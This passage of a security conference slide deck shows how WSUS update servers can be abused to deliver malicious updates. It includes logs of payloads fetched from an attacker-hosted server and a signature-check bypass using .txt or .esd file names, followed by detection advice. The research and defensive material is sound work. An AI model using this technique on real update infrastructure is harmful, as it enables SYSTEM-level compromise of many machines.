2025-12-20 20:08:13.949 UTC       Info      WsusService.8    SusEventDispatcher.TriggerEvent TriggerEvent called for
NotificationEventName: DeploymentChange, EventInfo: DeploymentChange
2025-12-20 20:08:13.964 UTC       Info      WsusService.50   ContentSyncAgent.WakeUpWorkerThreadProc ServerHealth: Updating Server
Health for Component: ContentSyncAgent Running, Marking as Running
2025-12-20 20:08:13.964 UTC       Info      WsusService.50   ContentSyncAgent.WakeUpWorkerThreadProc Processing Item: e1e609f1-
436e-4fba-a9d0-3291eb717ecd, State: 10
2025-12-20 20:08:14.073 UTC       Info      WsusService.50   ContentSyncAgent.Download       Item: e1e609f1-436e-4fba-a9d0-
3291eb717ecd has been submitted to BITS for Download
2025-12-20 20:08:14.073 UTC       Info      WsusService.50   ContentSyncAgent.WakeUpWorkerThreadProc ContentSyncAgent found no more
Jobs, going to Sleep for BITS Notifications
2025-12-20 20:08:34.090 UTC       Info      WsusService.52   ThreadEntry       ThreadHelper.ThreadStart
2025-12-20 20:08:34.090 UTC       Error     WsusService.52   ContentSyncAgent.JobError       Download error:
http://198.51.100.1:8000/Specter.exe failed in download: (-2145386477) The server does not support the necessary HTTP
protocol. Background Intelligent Transfer Service (BITS) requires that the server support the Range protocol header.

   at Microsoft.UpdateServices.ServerSync.ContentSyncAgent.JobError(IBitsJob job, BitsJobError joberror, String
fileRemoteName)
   at Microsoft.UpdateServices.ServerSync.ContentSyncAgent.MonitorStatusThreadProc()
   at System.Threading.ExecutionContext.RunInternal(ExecutionContext executionContext, ContextCallback callback, Object state,
Boolean preserveSyncCtx)
   at System.Threading.ExecutionContext.Run(ExecutionContext executionContext, ContextCallback callback, Object state, Boolean
preserveSyncCtx)
   at System.Threading.ExecutionContext.Run(ExecutionContext executionContext, ContextCallback callback, Object state)
   at System.Threading.ThreadHelper.ThreadStart()
2025-12-20 20:08:34.090 UTC       Warning WsusService.50    ContentSyncAgent.ProcessBITSNotificationQueue    ContentSyncAgent
recieved Failure for Item: e1e609f1-436e-4fba-a9d0-3291eb717ecd, Item fails
```

52

## Slide 53

53

*A blurred WSUS/BITS event log fills the slide; one line is in sharp focus:*

```text
http://198.51.100.1:8000/Specter.exe failed in download: (-2145386477) The server does not support the necessary HTTP
protocol. Background Intelligent Transfer Service (BITS) requires that the server support the Range protocol header.
```

## Slide 54

# Blocker: Trouble Downloading

54

```text
# python3 pythonServer_SupportsBits.py
Starting HTTP Range Server on port 8000
Serving files from: /mnt/remote-share/Mythic_Payloads
Server URL: http://localhost:8000/
Press Ctrl+C to stop the server
------------------------------------------------------------
[10.2.10.3] "HEAD /Specter.exe HTTP/1.1" 200 -
[10.2.10.3] "GET /Specter.exe HTTP/1.1" 206 -
[10.2.10.3] "GET /Specter.exe HTTP/1.1" 206 -
[10.2.10.3] "GET /Specter.exe HTTP/1.1" 206 -
[10.2.10.3] "GET /Specter.exe HTTP/1.1" 206 -
[10.2.10.3] "GET /Specter.exe HTTP/1.1" 206 -
[10.2.10.3] "GET /Specter.exe HTTP/1.1" 206 -
[10.2.10.3] "GET /Specter.exe HTTP/1.1" 206 -
[10.2.10.3] "GET /Specter.exe HTTP/1.1" 206 -
[10.2.10.3] "GET /Specter.exe HTTP/1.1" 206 -
[10.2.10.3] "GET /Specter.exe HTTP/1.1" 206 -
[10.2.10.3] "GET /Specter.exe HTTP/1.1" 206 -
```

## Slide 55

# Exploitation Difficulty

- WSUS Administrator
- WSUS File System Access
- Digitally Signature

Nunito Sans

*A photo of a tall stack of peanut-butter-and-jelly sandwiches.*

55

## Slide 56

# Blocker: Trouble Downloading

*WSUS console update-detail pane for the update "Specter":*

**Specter**

> The files for this update failed to download. The update can be approved but will not be available to computers until the download is complete. Click Retry Download to start the download again.

**Status:**

- Computers with errors: 0
- Computers needing this update: 0
- Computers installed/not applicable: 0
- Computers with no status: 3

MSRC severity: Critical
MSRC number:
Release date: Saturday, August 30, 2025
KB article numbers: 5006103

**Description**

Install this update to resolve issues in Windows.

56

## Slide 57

# Lateral Movement

A key consideration with WSUS lateral movement is that there is no way to control when a client checks in from the server. This means that once a patch is deployed the lateral movement won't succeed until the client installs the update. Often times the client will check in for patches on a regular cycle, for example daily, but the patches won't be installed until a patching day that might happen once a month. Some clients may be configured to install patches immediately if their priority level is high enough.

The first step of abusing WSUS is to create the malicious patch, which does have some limitations. When creating the patch there are various values that can be configured through the command line in SharpWSUS, allowing the operator to change the Indicators of Compromise (IoCs) of the patch. There is also a value for the payload and arguments. The payload must be a Microsoft signed binary and must point to a location on disk for the WSUS server to that binary.

While the need for a signed binary can limit some attack paths, there are still plenty of binaries that could be used such as *PsExec.exe* to run a command as SYSTEM, *RunDLL32.exe* to run a malicious DLL on a network share, *MsBuild.exe* to grab and execute a remote payload and more. The example in this blog will use *PsExec.exe* for code execution (https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).

A patch leveraging *PsExec.exe* can be done with the following command:

*Image: a cartoon girl with braces holding a plastic bag with a goldfish, labeled "WSUS" (on her forehead) and "Unsigned Payload" (on the bag).*

57

## Slide 58

# Bypassing Signature Verification

### Bypassing Signature Verification

```text
2025-12-20 20:29:13.464 UTC       Info      WsusService.34
ContentSyncAgent.ContentSyncSPFireStateMachineEvent       ContentSyncAgent firing Event:
FileVerificationFailed for Item: e1e609f1-436e-4fba-a9d0-3291eb717ecd
```

58

## Slide 59

# Bypassing Signature Verification

### Bypassing Signature Verification

This PC > Windows 10 (C:) > Program Files > Update Services > Services

| Name | Date modified | Type |
| --- | --- | --- |
| en-US | 12/18/2025 1:34 PM | File folder |
| Microsoft.UpdateServices.CatalogSyncAgent.dll | 12/18/2025 1:34 PM | Application extens... |
| Microsoft.UpdateServices.ContentSyncAgent.dll | 12/18/2025 1:34 PM | Application extens... |
| Microsoft.UpdateServices.Reporting.Rollup.dll | 12/18/2025 1:34 PM | Application extens... |
| Microsoft.Windows.BITS.dll | 12/18/2025 1:34 PM | Application extens... |
| WSusCertServer | 12/18/2025 1:34 PM | Application |
| WsusService | 12/18/2025 1:34 PM | Application |
| WsusService.exe.config | 9/15/2018 3:13 AM | CONFIG File |

59

## Slide 60

```text
dnSpy v6.1.8 (64-bit, .NET)
File   Edit   View   Debug   Window   Help        C#

Assembly Explorer

ContentSyncAgent @02000005
    Base Type and Interfaces
    Derived Types
    .cctor() : void @06000030
    ContentSyncAgent() : void @06000010
    CleanupAfterBitsFailure(string) : void @06000019
    ConstructFileUrlOnUss(byte[], string) : string @0600002B
    ContentSyncSPFireStateMachineEvent(DataAccess, Guid, string, string) : voi
    Download(ref string, ref string, ref string, FileNeededByContentAgent, ref IB
    EnqueueNotification(Guid, bool) : void @06000018
    EventReportingContentFile(string, string, string, UpdateIdentity[], WsusEven
    EventReportingContentFile(string, string, string, UpdateIdentity[], WsusEven
    EventReportingContentSyncAgent(short, string) : void @0600002D
    ExecuteSPGetExportUpdateData(int) : ExportUpdateData @06000022
    ExecuteSPGetNextContentSyncWorkItem() : FileNeededByContentAgent @0
    ExecuteSPGetNextContentSyncWorkItemOnStartup(byte[]) : FileNeededByC
    ExecuteSPNotifyContentSyncNotificationEventWorking() : void @06000021
    GetUNCFilePath(string) : string @06000013
    GetUpdatesForFile(Guid) : UpdateInformationForFile @06000023
    JobError(IBitsJob, BitsJobError, string) : void @06000017
```

60

## Slide 61

*The `ExecuteSPGetNextContentSyncWorkItem` entry is highlighted.*

```text
dnSpy v6.1.8 (64-bit, .NET)
File   Edit   View   Debug   Window   Help        C#

Assembly Explorer

ContentSyncAgent @02000005
    Base Type and Interfaces
    Derived Types
    .cctor() : void @06000030
    ContentSyncAgent() : void @06000010
    CleanupAfterBitsFailure(string) : void @06000019
    ConstructFileUrlOnUss(byte[], string) : string @0600002B
    ContentSyncSPFireStateMachineEvent(DataAccess, Guid, string, string) : voi
    Download(ref string, ref string, ref string, FileNeededByContentAgent, ref IB
    EnqueueNotification(Guid, bool) : void @06000018
    EventReportingContentFile(string, string, string, UpdateIdentity[], WsusEven
    EventReportingContentFile(string, string, string, UpdateIdentity[], WsusEven
    EventReportingContentSyncAgent(short, string) : void @0600002D
    ExecuteSPGetExportUpdateData(int) : ExportUpdateData @06000022
    ExecuteSPGetNextContentSyncWorkItem() : FileNeededByContentAgent @0
    ExecuteSPGetNextContentSyncWorkItemOnStartup(byte[]) : FileNeededByC
    ExecuteSPNotifyContentSyncNotificationEventWorking() : void @06000021
    GetUNCFilePath(string) : string @06000013
    GetUpdatesForFile(Guid) : UpdateInformationForFile @06000023
    JobError(IBitsJob, BitsJobError, string) : void @06000017
```

61

## Slide 62

```csharp
private VerifyResult VerifyFile(string fileLocalPath, string additionalHash)
{
    if (fileLocalPath == null)
    {
        throw new ArgumentNullException("fileLocalPath");
    }
    VerifyResult verifyResult = ContentSyncAgent.VerifyCRC(fileLocalPath,
        additionalHash) ? VerifyResult.Valid : VerifyResult.InvalidCRC;
    if (verifyResult == VerifyResult.Valid)
    {
        bool flag = true;
        if (fileLocalPath.ToLower(CultureInfo.InvariantCulture).EndsWith
            (".txt", StringComparison.OrdinalIgnoreCase) || fileLocalPath.ToLower
            (CultureInfo.InvariantCulture).EndsWith(".esd",
            StringComparison.OrdinalIgnoreCase))
        {
            flag = false;
        }
        if (flag)
        {
            verifyResult = (CabUtilities.CheckCertificateSignature
                (fileLocalPath, true) ? VerifyResult.Valid :
                VerifyResult.InvalidCert);
        }
    }
    return verifyResult;
```

62

## Slide 63

# Bypassing Signature Verification

### Bypassing Signature Verification

```text
[10.2.10.3] "HEAD /Ghost.txt HTTP/1.1" 200 -
[10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
[10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
[10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
[10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
[10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
[10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
[10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
[10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
[10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
[10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
[10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
```

63

## Slide 64

# Bypassing Signature Verification

### Bypassing Signature Verification

*WSUS console update-detail pane for the update "Ghost":*

**Ghost**

**Status:**

- Computers with errors: 0
- Computers needing this update: 0
- Computers installed/not applicable: 0
- Computers with no status: 3

MSRC severity: Critical
MSRC number:
Release date: Saturday, August 30, 2025
KB article numbers: 5006103

**Description**

Install this update to resolve issues in Windows.

**Additional Details**

| Field | Value |
| --- | --- |
| More information: | https://specter.local |
| Removable: | Yes |
| Restart behavior: | Can request restart |
| May request user input: | No |
| Must be installed exclusively: | No |
| Microsoft Software License Terms: | This update does not have Microsoft Software License Terms. |
| Products: | None |
| Updates superseding this update: | None |
| Updates superseded by this update: | None |
| Languages supported: | All |
| Update ID: | 0a93df0b-afd2-449e-8a52-0115a0de686d |

64

## Slide 65

# Bypassing Signature Verification

### Bypassing Signature Verification

```text
2025-12-20 21:31:19.870 UTC       Info      WsusService.22   ContentSyncAgent.ContentSyncSPFireStateMachineEvent
ContentSyncAgent firing Event: FileVerified for Item: fb1010eb-cca7-42df-a130-9eccb4d0f581

2025-12-20 21:31:19.870 UTC       Info      WsusService.22   EventLogEventReporter.ReportEvent
EventId=366,Type=Information,Category=Synchronization,Message=Content file download succeeded.
Digest:
Source File: /Ghost.txt
Destination File: C:\\WSUS\WsusContent\95\4861DE7211476BAC49F126F6946AF29080CFD995.txt
```

65

## Slide 66

# Bypassing Signature Verification

### Bypassing Signature Verification

*Windows Update settings screenshot:*

**Windows Update**

Updates available
Last checked: Today, 4:38 PM

Download & install all

Ghost — Downloading - 0%

66

## Slide 67

# Bypassing Signature Verification

### Bypassing Signature Verification

| HOST | USER | DOMAIN | PID | LAST CHECKIN | DESCRIPTION |
|---|---|---|---|---|---|
| WORKSTATION2 | SYSTEM | LUDUS | 10088 | 15 seconds | Whooooohooooooo!!! |

67

## Slide 68

# Exploitation Difficulty

- WSUS Administrator
- WSUS File System Access
- Digitally Signature

*(Decorative image: a McDonald's "McDelivery" / Uber Eats food-delivery meme.)*

68

## Slide 69

*Windows Terminal screenshot with two "Windows PowerShell" tabs; an otherwise empty prompt.*

```text
root@ludus3:/mnt/remote-share/WSUSpicious#
```

tmux status bar:

```text
[Wsusing] 0:Ntlmrelayx- 1:WSUSpicious  2:BitsWebServer*Z 3:bash  4:bash                 "ludus3" 20:28 30-Dec-
```

*"Activate Windows / Go to Settings to activate Windows." watermark; taskbar clock 5:28 PM 12/30/2025.*

69

## Slide 70

# WSUS Client Setting Options

| Setting | State | Comment |
|---|---|---|
| Defer Windows Updates |  |  |
| Do not display 'Install Updates and Shut Down' option in Sh... | Not configured | No |
| Do not adjust default option to 'Install Updates and Shut Do... | Not configured | No |
| Enabling Windows Update Power Management to automati... | Not configured | No |
| Turn off auto-restart for updates during active hours | Not configured | No |
| Always automatically restart at the scheduled time | Not configured | No |
| Specify deadline before auto-restart for update installation | Not configured | No |
| Configure Automatic Updates | Not configured | No |
| Specify intranet Microsoft update service location | Not configured | No |
| Automatic Updates detection frequency | Not configured | No |
| Remove access to use all Windows Update features | Not configured | No |
| Do not connect to any Windows Update Internet locations | Not configured | No |
| Allow non-administrators to receive update notifications | Not configured | No |
| Do not include drivers with Windows Updates | Not configured | No |
| Turn on Software Notifications | Not configured | No |
| Allow Automatic Updates immediate installation | Not configured | No |
| Turn on recommended updates via Automatic Updates | Not configured | No |
| No auto-restart with logged on users for scheduled automat... | Not configured | No |
| Re-prompt for restart with scheduled installations | Not configured | No |
| Delay Restart for scheduled installations | Not configured | No |
| Reschedule Automatic Updates scheduled installations | Not configured | No |
| Enable client-side targeting | Not configured | No |
| Allow signed updates from an intranet Microsoft update ser... | Not configured | No |

*("Configure Automatic Updates" is highlighted/selected in the list.)*

70

## Slide 71

*Screenshot: Local Group Policy Editor — "Configure Automatic Updates" setting dialog.*

**Configure Automatic Updates**

Configure Automatic Updates          Previous Setting | Next Setting

- ○ Not Configured
- ● Enabled
- ○ Disabled

Comment:

Supported on: Windows XP Professional Service Pack 1 or At least Windows 2000 Service Pack 3

Options:

Configure automatic updating:

`3 - Auto download and notify for install`

- 2 - Notify for download and notify for install
- 3 - Auto download and notify for install
- 4 - Auto download and schedule the install
- 5 - Allow local admin to choose setting

Scheduled install day: `0 - Every day`

Scheduled install time: `03:00`

☐ Install updates for other Microsoft products

Help:

```text
accidental data loss.

    Automatic maintenance can be further configured by using Group Policy settings here: Computer Configuration->Administrative Templates->Windows Components->Maintenance Scheduler

    5 = Allow local administrators to select the configuration mode that Automatic Updates should notify and install updates.

    With this option, local administrators will be allowed to use the Windows Update control panel to select a configuration option of their choice. Local administrators will not be allowed to disable the configuration for Automatic Updates.

If the status for this policy is set to Disabled, any updates that are available on Windows Update must be downloaded and installed manually. To do this, search for Windows Update using Start.

If the status is set to Not Configured, use of Automatic Updates is not specified at the Group Policy level. However, an
```

OK | Cancel | Apply

71

## Slide 72

# Prevention and Detection

On the WSUS Database server:

- Extended Protection for Authentication (EPA)

- Only allow network access from the WSUS server and administrative locations to the database

- Monitor the execution of the spCreateTargetGroups stored procedure

- Monitor the execution of spSetBatchURL for update files ending in .txt or .esd

- Monitor the execution of spDeployUpdate from non-computer accounts

72

## Slide 73

# Goodies

### Ludus WSUS Range

*GitHub repository screenshot — github.com/bagelByt3s/ludus_wsus*

**README** — WSUS Collection for Ansible and Ludus

This collection includes Ansible roles to install WSUS. For a good example of the collection's usage, see the `WSUS-Range.yml` .

Roles included in this collection:

- `bagelByt3s.ludus_wsus.ludus_wsus_client_initiate`
- `bagelByt3s.ludus_wsus.ludus_wsus_configure_client_gpo`
- `bagelByt3s.ludus_wsus.ludus_wsus_force_group_policy_update`
- `bagelByt3s.ludus_wsus.ludus_wsus_install_wsus_server`
- `bagelByt3s.ludus_wsus.ludus_wsus_wsus_sql`

Associated Blogpost: TBD

**Installation in Ludus**

Install via Ansible Galaxy:

```text
ludus ansible collection add bagelbyt3s.ludus_wsus
```

73

## Slide 74

# Goodies

### NotW SUSpicious.py

*GitHub repository screenshot:*

**NotWSUSpicious** (Private)    Watch 0 | Fork 0 | Star 0

main | 1 Branch | 0 Tags    Go to file | Add file | Code

bagelByt3s — Fixed ascii art — 93ff74e · 1 minute ago — 14 Commits

| File | Commit message | Time |
|---|---|---|
| custom-mssqlclient | Added custom-mssqlclient | yesterday |
| BitsWebServer.py | Added bitsWebServer.py | yesterday |
| NotWSUSpicious.py | Fixed ascii art | 1 minute ago |
| README.md | Updated for WSUSpicious to NotWSUSpicious | 6 minutes ago |

**README** — NotWSUSpicious

*(ASCII art banner — illegible.)*

**About**

Python helper to generate SQL commands to create a custom update in the Windows Service Update Service (WSUS) database.

Readme | Activity | 0 stars | 0 watching | 0 forks

**Releases** — No releases published — Create a new release

**Packages** — No packages published — Publish your first package

**Languages**

74

## Slide 75

# Goodies

- https://github.com/bagelByt3s/ludus_wsus

- https://github.com/bagelByt3s/NotWSUSpicious

- https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/

- https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/

- https://specterops.io/blog/2026/08/05/built-a-wsus-ludus-lab/

- https://specterops.io/blog/2026/08/05/weaponizing-windows-updates-with-notwsuspicious/

75

## Slide 76

# References

- https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902491(v=vs.85))

- https://blackhat.com/docs/us-17/wednesday/us-17-Coltel-WSUSpendu-Use-WSUS-To-Hang-Its-Clients-wp.pdf

- https://github.com/nettitude/SharpWSUS

- https://learn.microsoft.com/de-de/security-updates/windowsupdateservices/18127375

- <u>https://posts.specterops.io/the-renaissance-of-ntlm-relay-attacks-everything-you-need-to-know-abfc3677c34e</u>

- https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-1/takeover-1_description.md

76

## Slide 77

# Thank You

- X: @bagelByt3s
- in: Beyviel David

*(Image: the shark "Bruce" from Finding Nemo, captioned "Windows Updates are Friends Not Food". Slide also carries the Black Hat USA 2026 and SpecterOps logos.)*

77

